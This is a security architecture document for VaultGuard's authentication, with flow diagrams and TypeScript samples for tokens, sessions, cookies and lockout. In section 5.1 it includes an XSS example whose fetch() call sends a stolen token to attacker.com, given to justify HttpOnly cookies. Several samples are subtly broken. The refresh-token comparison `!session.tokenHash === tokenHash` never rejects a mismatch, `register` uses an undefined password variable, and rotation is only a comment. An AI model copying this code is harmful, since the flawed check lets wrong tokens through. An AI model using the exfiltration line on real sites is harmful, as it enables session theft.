# Authentication Architecture (Target)

**Date:** September 2026  
**Gate:** G3 - Security/Crypto Architecture
**Status:** APPROVED WITH CONDITIONS; implementation remains pending G5
**Focus:** Session Management, Token Security, Account Lifecycle

---

## 1. Executive Summary

**Current State Issues (P0):**

- ❌ Refresh tokens stored in localStorage (XSS vulnerability)
- ❌ No session revocation (cannot enforce logout)
- ❌ JWT secrets hardcoded as fallbacks
- ❌ No token rotation strategy
- ❌ No account lockout mechanism

**Recommended Solution:**

- ✅ Move to HttpOnly cookies (immune to XSS for token theft)
- ✅ Implement SessionToken collection for revocation
- ✅ Add token rotation on refresh
- ✅ Require environment variables for secrets (fail if missing)
- ✅ Add rate limiting on auth endpoints
- ✅ Implement account lockout after failed attempts

**Risk Level:** HIGH (security critical path)

---

## 2. Account Authentication Flow

### 2.1 Registration

```
USER                          BROWSER                        SERVER
  │                              │                              │
  ├──submission──────────────────>│                              │
  │                               │─POST /api/v1/auth/register──>│
  │                               │                              │
  │                               │ 1. Validate input schema    │
  │                               │ 2. Check email not exists   │
  │                               │ 3. Hash password (bcrypt)   │
  │                               │ 4. Create user doc          │
  │                               │ 5. Create default vault     │
  │                               │ 6. Log activity             │
  │                               │ 7. Generate tokens          │
  │                               │<────┐                       │
  │                               │     └─201 { user, tokens }  │
  │                               │                              │
  │<──success notification────────│                              │
  │                               │ Set cookies:               │
  │                               │ - vaultguard_token (access) │
  │                               │ - vaultguard_refresh        │
  │                               │                              │
  │  Auto-redirect to dashboard   │                              │
```

**Implementation:**

```typescript
// src/api/services/authService.ts
export async function register(
  email: string,
  masterPassword: string,
  fullName: string,
): Promise<AuthResponse> {
  // 1. Validate input
  const schema = Joi.object({
    email: Joi.string().email().required(),
    masterPassword: Joi.string().min(12).max(255).required(),
    fullName: Joi.string().required(),
  });

  const { error, value } = schema.validate({ email, masterPassword, fullName });
  if (error) throw new AppError(error.message, 400, "VALIDATION_ERROR");

  // 2. Check email not exists
  const existing = await userRepository.findByEmail(email);
  if (existing) {
    throw new AppError("Email already registered", 409, "EMAIL_EXISTS");
  }

  // 3. Verify/store the account authentication password only.
  // The vault master password is a separate browser-only secret.
  const accountPasswordVerifier = await createAccountPasswordVerifier(accountPassword);

  // 4. Create user
  const user = await userRepository.create({
    email,
    accountPasswordVerifier,
    fullName,
    emailVerified: false, // Phase 2: Email verification
  });

  // 5. Create default vault
  const vault = await vaultRepository.create({
    userId: user.id,
    name: "Default Vault",
    isDefault: true,
  });

  // 6. Log activity
  await activityService.logUserRegistered(user.id);

  // 7. Generate tokens
  const tokens = await tokenUtils.generateTokens(user.id);

  // 8. Create session
  await sessionRepository.create({
    userId: user.id,
    tokenHash: hash(tokens.refreshToken),
    refreshTokenExpiry: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
  });

  return {
    user: formatUserResponse(user),
    accessToken: tokens.accessToken,
    refreshToken: tokens.refreshToken, // Only for this response, cookie for storage
  };
}
```

### 2.2 Login

```
USER                          BROWSER                        SERVER
  │                              │                              │
  ├──credentials─────────────────>│                              │
  │                               │─POST /api/v1/auth/login────>│
  │                               │                              │
  │                               │ 1. Find user by email       │
  │                               │ 2. Compare password         │
  │                               │ 3. Check not locked out     │
  │                               │ 4. Generate tokens          │
  │                               │ 5. Revoke old sessions      │
  │                               │<────┐                       │
  │                               │     └─200 { user, tokens }  │
  │                               │                              │
  │<──success response────────────│ Set HttpOnly cookies        │
  │                               │                              │
  │  Navigate to /dashboard       │                              │
```

**Implementation:**

```typescript
export async function login(
  email: string,
  masterPassword: string,
  ipAddress: string,
  userAgent: string,
): Promise<AuthResponse> {
  // 1. Find user
  const user = await userRepository.findByEmail(email);
  if (!user) {
    // Don't leak email existence
    throw new AppError("Invalid credentials", 401, "AUTH_FAILED");
  }

  // 2. Check if locked out
  const recentFailures = await authService.getRecentFailedAttempts(email);
  if (recentFailures >= 5) {
    // Account locked for 30 minutes
    throw new AppError(
      "Account locked. Try again in 30 minutes.",
      429,
      "ACCOUNT_LOCKED",
    );
  }

  // 3. Verify password
  const isValid = await user.comparePassword(masterPassword);
  if (!isValid) {
    // Log failed attempt
    await auditService.logFailedLogin(email, ipAddress, userAgent);

    // Increment failure counter
    await authService.recordFailedAttempt(email);

    throw new AppError("Invalid credentials", 401, "AUTH_FAILED");
  }

  // 4. Clear failed attempts
  await authService.clearFailedAttempts(email);

  // 5. Update last login
  await userRepository.update(user.id, {
    lastLogin: new Date(),
  });

  // 6. Revoke all existing sessions (logout all devices)
  // Optional: ask user if they want this or keep other sessions
  await sessionRepository.revokeAllByUser(user.id, "new_login");

  // 7. Generate new tokens
  const tokens = await tokenUtils.generateTokens(user.id);

  // 8. Create new session
  await sessionRepository.create({
    userId: user.id,
    tokenHash: hash(tokens.refreshToken),
    refreshTokenExpiry: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    ipAddress,
    userAgent,
  });

  // 9. Log successful login
  await auditService.logSuccessfulLogin(user.id, ipAddress, userAgent);

  return {
    user: formatUserResponse(user),
    accessToken: tokens.accessToken,
    refreshToken: tokens.refreshToken,
  };
}
```

### 2.3 Logout

```
USER                          BROWSER                        SERVER
  │                              │                              │
  ├──click logout────────────────>│                              │
  │                               │─POST /api/v1/auth/logout───>│
  │                               │                              │
  │                               │ 1. Extract user from token  │
  │                               │ 2. Revoke current session   │
  │                               │ 3. Clear tokens             │
  │                               │<────┐                       │
  │                               │     └─200 OK               │
  │                               │                              │
  │<──success notification────────│ Clear HttpOnly cookies      │
  │                               │                              │
  │  Navigate to /login           │                              │
```

**Implementation:**

```typescript
export async function logout(
  userId: string,
  refreshToken: string,
): Promise<void> {
  // 1. Find and revoke session
  const tokenHash = hash(refreshToken);

  await sessionRepository.revoke(userId, tokenHash, "logout");

  // 2. Log activity
  await activityService.logLogout(userId);
}
```

---

## 3. Token Management

### 3.1 JWT Structure

**Access Token** (short-lived):

```
{
  "sub": "user-id",
  "email": "user@example.com",
  "iat": 1694342400,
  "exp": 1694346000,
  "type": "access"
}
```

**Refresh Token** (long-lived):

```
{
  "sub": "user-id",
  "iat": 1694342400,
  "exp": 1701120400,
  "type": "refresh",
  "jti": "unique-token-id"
}
```

### 3.2 Token Lifetimes

| Token                | Lifetime        | Rationale                                            |
| -------------------- | --------------- | ---------------------------------------------------- |
| Access               | 15 minutes      | Short-lived reduces XSS risk window                  |
| Refresh              | 7 days          | Long enough for convenience, forces periodic re-auth |
| Password change      | Invalidates all | Security event                                       |
| Logout               | Immediate       | User-initiated revocation                            |
| Failed login lockout | 30 minutes      | Rate limiting                                        |

### 3.3 Token Generation

```typescript
// src/api/utils/tokenUtils.ts
export async function generateTokens(userId: string) {
  const now = Date.now();
  const accessExpiry = now + 15 * 60 * 1000; // 15 minutes
  const refreshExpiry = now + 7 * 24 * 60 * 60 * 1000; // 7 days

  const accessToken = jwt.sign(
    {
      sub: userId,
      type: "access",
      iat: Math.floor(now / 1000),
      exp: Math.floor(accessExpiry / 1000),
    },
    process.env.JWT_SECRET!,
    { algorithm: "HS256" },
  );

  const refreshToken = jwt.sign(
    {
      sub: userId,
      type: "refresh",
      jti: crypto.randomUUID(),
      iat: Math.floor(now / 1000),
      exp: Math.floor(refreshExpiry / 1000),
    },
    process.env.JWT_REFRESH_SECRET!,
    { algorithm: "HS256" },
  );

  return { accessToken, refreshToken };
}

export async function verifyAccessToken(token: string) {
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET!, {
      algorithms: ["HS256"],
    });

    if (decoded.type !== "access") {
      throw new Error("Invalid token type");
    }

    return decoded;
  } catch (error) {
    throw new AppError("Invalid or expired token", 401, "INVALID_TOKEN");
  }
}

export async function verifyRefreshToken(token: string) {
  try {
    const decoded = jwt.verify(token, process.env.JWT_REFRESH_SECRET!, {
      algorithms: ["HS256"],
    });

    if (decoded.type !== "refresh") {
      throw new Error("Invalid token type");
    }

    return decoded;
  } catch (error) {
    throw new AppError(
      "Invalid or expired refresh token",
      401,
      "INVALID_REFRESH_TOKEN",
    );
  }
}
```

### 3.4 Token Refresh Flow

```
BROWSER                        SERVER
   │                              │
   │  Access token expired        │
   │                              │
   ├─POST /api/v1/auth/refresh───>│
   │  (includes refresh token)    │
   │                              │
   │  1. Verify refresh token    │
   │  2. Check token not revoked │
   │  3. Generate new access     │
   │  4. Rotate refresh token     │
   │  5. Update session          │
   │<──200 { accessToken }───────│
   │                              │
   │  Retry original request      │
```

**Implementation:**

```typescript
export async function refreshAccessToken(
  userId: string,
  refreshToken: string,
): Promise<{ accessToken: string }> {
  // 1. Verify refresh token signature
  const decoded = await tokenUtils.verifyRefreshToken(refreshToken);

  // 2. Check if token is revoked
  const session = await sessionRepository.findByUserId(userId);
  if (!session || session.revokedAt) {
    throw new AppError("Session revoked", 401, "SESSION_REVOKED");
  }

  const tokenHash = hash(refreshToken);
  if (!session.tokenHash === tokenHash) {
    throw new AppError("Token mismatch", 401, "INVALID_TOKEN");
  }

  // 3. Generate new access token
  const newAccessToken = jwt.sign(
    {
      sub: userId,
      type: "access",
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor((Date.now() + 15 * 60 * 1000) / 1000),
    },
    process.env.JWT_SECRET!,
  );

  // 4. Rotation is mandatory. Atomically consume the presented token,
  // create its replacement, and revoke the token family on reuse.

  return { accessToken: newAccessToken };
}
```

---

## 4. Session Revocation (G3 target; implementation at G5)

### 4.1 SessionToken Model

```typescript
// src/api/models/SessionToken.ts
export interface ISessionToken extends Document {
  userId: ObjectId;
  tokenHash: string;

  // Token lifetimes
  accessTokenExpiry: Date;
  refreshTokenExpiry: Date;

  // Device/session info
  userAgent: string;
  ipAddress: string;
  deviceName?: string;

  // Revocation
  revokedAt?: Date;
  revocationReason?: string; // 'logout' | 'password_change' | 'login_from_new_device' | 'admin_revoke'

  // Timestamps
  createdAt: Date;
  updatedAt: Date;
}

const sessionSchema = new Schema<ISessionToken>({
  userId: {
    type: Schema.Types.ObjectId,
    ref: "User",
    required: true,
    index: true,
  },

  tokenHash: {
    type: String,
    required: true,
    unique: true,
    // NOT the actual token, only cryptographic hash
  },

  accessTokenExpiry: {
    type: Date,
    required: true,
  },

  refreshTokenExpiry: {
    type: Date,
    required: true,
    index: true,
  },

  userAgent: String,
  ipAddress: String,
  deviceName: String,

  revokedAt: Date,
  revocationReason: String,

  createdAt: {
    type: Date,
    default: Date.now,
    immutable: true,
  },

  updatedAt: {
    type: Date,
    default: Date.now,
  },
});

// TTL index: Auto-delete when refresh token expires
sessionSchema.index({ refreshTokenExpiry: 1 }, { expireAfterSeconds: 0 });

// Compound index for quick lookup
sessionSchema.index({ userId: 1, revokedAt: 1 });
```

### 4.2 Revocation Scenarios

| Scenario              | Action                         | Reason             |
| --------------------- | ------------------------------ | ------------------ |
| User logout           | Revoke current session         | User-initiated     |
| Password change       | Revoke all sessions            | Security event     |
| Login from new device | Revoke old sessions (optional) | User preference    |
| Suspicious activity   | Admin revokes                  | Security event     |
| Refresh token expired | Auto-delete via TTL            | Natural expiration |

### 4.3 Revocation Implementation

```typescript
// Revoke single session
export async function revokeSingleSession(
  userId: string,
  sessionId: string,
  reason: string,
) {
  await sessionRepository.updateOne(
    { _id: sessionId, userId },
    {
      revokedAt: new Date(),
      revocationReason: reason,
    },
  );
}

// Revoke all user sessions
export async function revokeAllSessions(
  userId: string,
  reason: string = "logout_all",
) {
  await SessionTokenModel.updateMany(
    { userId },
    {
      revokedAt: new Date(),
      revocationReason: reason,
    },
  );
}

// Revoke all sessions EXCEPT current
export async function revokeOtherSessions(
  userId: string,
  currentSessionId: string,
  reason: string = "logout_other_devices",
) {
  await SessionTokenModel.updateMany(
    { userId, _id: { $ne: currentSessionId } },
    {
      revokedAt: new Date(),
      revocationReason: reason,
    },
  );
}
```

---

## 5. Cookie-Based Token Storage (G3 target; implementation at G5)

### 5.1 Current vs. Recommended

**CURRENT STATE (prototype - XSS risk):**

```javascript
// Vulnerable to XSS: JavaScript can access
localStorage.setItem("vaultguard_token", accessToken);
localStorage.setItem("vaultguard_refresh_token", refreshToken);

// XSS attack:
const stolenToken = localStorage.getItem("vaultguard_token");
fetch("https://attacker.com/steal?token=" + stolenToken);
```

**TARGET STATE (G3 approved architecture):**

```javascript
// Server sets in Set-Cookie header
// JavaScript cannot access (immune to XSS)
// Browser automatically sends with each request

Set-Cookie: vaultguard_token=eyJhbG...; HttpOnly; Secure; SameSite=Strict; Path=/
Set-Cookie: vaultguard_refresh_token=eyJhbG...; HttpOnly; Secure; SameSite=Strict; Path=/api/v1/auth

// Even if XSS occurs:
localStorage.getItem('vaultguard_token') // undefined
// Attacker cannot steal tokens
```

### 5.2 Cookie Configuration

```typescript
// src/api/routes/auth.ts
export function setTokenCookies(
  res: Response,
  accessToken: string,
  refreshToken: string,
) {
  const secure = process.env.NODE_ENV === "production";
  const domain = process.env.COOKIE_DOMAIN || "localhost";

  // Access token (short-lived, more restrictive path)
  res.cookie("vaultguard_token", accessToken, {
    httpOnly: true,
    secure,
    sameSite: "strict",
    path: "/api",
    maxAge: 15 * 60 * 1000, // 15 minutes
  });

  // Refresh token (long-lived, specific path)
  res.cookie("vaultguard_refresh_token", refreshToken, {
    httpOnly: true,
    secure,
    sameSite: "strict",
    path: "/api/v1/auth/refresh",
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  });
}

export function clearTokenCookies(res: Response) {
  res.clearCookie("vaultguard_token", { path: "/api" });
  res.clearCookie("vaultguard_refresh_token", { path: "/api/v1/auth/refresh" });
}
```

### 5.3 CSRF Protection

If using cookies, add CSRF token:

```typescript
// Generate CSRF token on login
const csrfToken = crypto.randomUUID();
await csrfRepository.create({
  userId,
  token: csrfToken,
  expiresAt: new Date(Date.now() + 60 * 60 * 1000),
});

// Return to frontend
res.json({
  success: true,
  csrfToken, // Frontend sends in X-CSRF-Token header
});

// Middleware validates CSRF
app.use((req, res, next) => {
  if (["POST", "PUT", "DELETE"].includes(req.method)) {
    const csrfToken = req.headers["x-csrf-token"];
    // Validate...
  }
  next();
});
```

---

## 6. Account Lockout & Rate Limiting

### 6.1 Failed Login Attempts

```typescript
// Track failed attempts in Redis (Phase 3+) or MongoDB
const MAX_FAILURES = 5;
const LOCKOUT_DURATION = 30 * 60 * 1000; // 30 minutes

export async function recordFailedAttempt(email: string) {
  const key = `failed_login:${email}`;
  const attempts = (await failedAttemptStore.get(key)) || 0;

  if (attempts >= MAX_FAILURES - 1) {
    await failedAttemptStore.set(`lockout:${email}`, true, LOCKOUT_DURATION);
  }

  await failedAttemptStore.set(key, attempts + 1, LOCKOUT_DURATION);
}

export async function getRecentFailedAttempts(email: string): Promise<number> {
  const isLockedOut = await failedAttemptStore.get(`lockout:${email}`);
  if (isLockedOut) {
    throw new AppError("Account locked", 429, "ACCOUNT_LOCKED");
  }

  return (await failedAttemptStore.get(`failed_login:${email}`)) || 0;
}

export async function clearFailedAttempts(email: string) {
  await failedAttemptStore.delete(`failed_login:${email}`);
}
```

### 6.2 Rate Limiting

```typescript
// src/api/middleware/rateLimiter.ts
export const authRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 15, // 15 requests per window
  keyGenerator: (req) => req.ip,
  message: "Too many login attempts, please try again later",
});

// Apply to /auth endpoints
router.post("/login", authRateLimiter, authController.login);
router.post("/register", authRateLimiter, authController.register);
```

---

## 7. Environment Configuration

### 7.1 Required Environment Variables

```bash
# Required (fail if missing)
JWT_SECRET=<strong-random-secret-min-64-chars>
JWT_REFRESH_SECRET=<different-strong-random-secret>
MONGODB_URI=mongodb+srv://user:pass@cluster.mongodb.net/vaultguard

# Optional (with sensible defaults)
NODE_ENV=production
PORT=3000
LOG_LEVEL=info
COOKIE_DOMAIN=localhost
```

### 7.2 Environment Validation

```typescript
// src/api/config/env.ts
import Joi from "joi";

const envSchema = Joi.object({
  JWT_SECRET: Joi.string().min(64).required(),
  JWT_REFRESH_SECRET: Joi.string().min(64).required(),
  MONGODB_URI: Joi.string().uri().required(),
  NODE_ENV: Joi.string()
    .valid("development", "production")
    .default("development"),
  PORT: Joi.number().default(3000),
  LOG_LEVEL: Joi.string().default("info"),
  COOKIE_DOMAIN: Joi.string().default("localhost"),
});

const { error, value } = envSchema.validate(process.env);

if (error) {
  throw new Error(`Environment validation failed: ${error.message}`);
}

export const envConfig = value;
```

---

## 8. Security Checklist

### 8.1 Pre-G3 Requirements

- [ ] Refresh tokens no longer in localStorage
- [ ] HttpOnly cookies implemented for tokens
- [ ] Session revocation in SessionToken collection
- [ ] Failed login attempt tracking implemented
- [ ] Account lockout after N failures
- [ ] JWT secrets required from environment
- [ ] CSRF protection if using cookies
- [ ] Password reset flow implemented
- [ ] Email verification (optional Phase 2)
- [ ] 2FA implementation follows the G3 lifecycle (implementation and verification at G5/G6)

### 8.2 Testing Requirements

- [ ] Unit tests for token generation/verification
- [ ] Integration tests for login flow
- [ ] Integration tests for token refresh
- [ ] Integration tests for logout/revocation
- [ ] Security tests for failed attempt lockout
- [ ] Security tests for XSS (localStorage vs cookies)

---

## 9. 2FA Architecture (G3 target; implementation at G5)

**TOTP-based (Time-based One-Time Password):**

```
1. On /settings/security: Generate QR code via speakeasy
2. User scans with authenticator app (Google Authenticator, Authy, etc.)
3. Store encrypted TOTP secret in DB
4. On login: Ask for 6-digit code after password
5. Verify using speakeasy.totp.verify()
```

**Backup codes (Phase 3+):**

```
1. Generate 10 single-use backup codes
2. Display once during 2FA setup
3. Store hashed in DB
4. Each code can bypass 2FA once
```

---

## 10. Password Reset Flow (Phase 2)

```
USER                          BROWSER                        SERVER
  │                              │                              │
  ├──forgot password─────────────>│                              │
  │                               │─GET /forgot-password────────│
  │                               │<───────────────────────────│
  │                               │ Show email form            │
  │                              │<─ Email input ─ submission ─>│
  │                               │ POST /api/v1/auth/forgot   │
  │                               │                              │
  │                               │ 1. Find user by email       │
  │                               │ 2. Generate reset token     │
  │                               │ 3. Store in DB (TTL 1hr)   │
  │                               │ 4. Send email with link     │
  │                               │<────────── 200 OK ──────────│
  │                               │ Show: "Email sent"          │
  │                              │                              │
  │  Check email                  │                              │
  │                              │                              │
  │  Click reset link from email  │                              │
  ├──open password reset page────>│                              │
  │                               │─GET /reset?token=abc123────│
  │                               │                              │
  │                               │ 1. Verify reset token       │
  │                               │ 2. Check not expired        │
  │                               │<────────── 200 OK ──────────│
  │                               │ Show reset form             │
  │                              │<─ New password ─ submit ────>│
  │                               │ POST /api/v1/auth/reset     │
  │                               │                              │
  │                               │ 1. Verify reset token       │
  │                               │ 2. Validate password        │
  │                               │ 3. Update user password     │
  │                               │ 4. Revoke all sessions      │
  │                               │ 5. Delete reset token       │
  │                               │<────────── 200 OK ──────────│
  │                               │                              │
  │<──success + redirect to login─│                              │
  │  Login with new password      │                              │
```

---

## 11. SECURITY DECISION REQUIRED

⚠️ **Before G3 Gate, Security/Crypto Architect Must Approve:**

1. **Token lifetime values** (15min access, 7day refresh) - acceptable risk?
2. **Password hashing algorithm** (bcrypt 10 rounds) - sufficient?
3. **Session storage** (MongoDB SessionToken) - appropriate for production?
4. **Cookie security settings** (HttpOnly, Secure, SameSite=Strict) - complete?
5. **CSRF protection** (if using cookies) - needed?
6. **Account lockout parameters** (5 failures, 30 min lockout) - proportionate?
7. **Failed attempt storage** (in-memory vs database) - feasible for Phase 1?
8. **Password reset token lifetime** (1 hour) - acceptable?
9. **2FA architecture** (TOTP + backup codes) - timing and requirements?
10. **Overall authentication flow** - meets zero-trust principles?

---

## Next Steps (Architecture Review)

1. ✅ Authentication architecture designed
2. ⏳ Vault encryption architecture to follow
3. ⏳ Migration risk register and ADRs to follow
4. ⏳ Final G2 architecture gate decision

**IMPORTANT:** This document records the approved G3 target. It does not claim that the current application implements these controls.

## 9. Authoritative G3 Corrections

### Two-secret model

VaultGuard uses separate secrets for the initial production architecture:

- **Account Authentication Password:** server-verified, represented only by a strong verifier, and used for account authentication and session authorization.
- **Vault Master Password:** browser-only, never sent to the server, used to derive the vault KEK and unwrap the VEK.

The account password does not decrypt the vault. Ordinary account-password recovery does not recover the Vault Master Password. No recovery mechanism is implied by this document.

Account verification and vault KEK derivation are separate Argon2id contexts with separate salts, parameter records, purposes, output handling, and versioning. An account verifier must never be reused as a KEK.

### Session requirements

The target uses Secure, HttpOnly, SameSite-configured cookies and server-tracked refresh sessions. Refresh tokens are hashed at rest, rotated on every successful refresh, and grouped into token families. Reuse of a replaced token revokes its family. Logout revokes the current session; password change revokes all sessions.

JWT verification must explicitly restrict algorithm, issuer, audience, token type, subject, and expiry. Missing production secrets fail closed.

### Gate ownership

G3 approves this architecture. G4 owns database architecture and JSON-to-Mongo migration planning. G5 owns implementation. G6 owns QA, G7 owns independent security audit, G8 owns visual regression, G9 owns code review, and G10 owns release readiness.
